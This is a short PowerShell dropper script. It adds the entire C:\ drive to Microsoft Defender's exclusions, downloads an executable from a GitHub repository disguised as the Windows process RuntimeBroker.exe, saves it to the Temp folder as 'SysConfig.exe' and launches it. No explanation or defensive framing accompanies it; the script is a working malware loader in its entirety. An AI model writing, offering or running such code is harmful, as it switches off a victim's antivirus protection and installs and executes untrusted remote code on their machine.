Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/Xmadter/runtime/raw/refs/heads/main/RuntimeBroker.exe"
$out = "$env:Temp\SysConfig.exe"
Invoke-WebRequest -Uri $url -OutFile $out 
Start-Process -FilePath $out
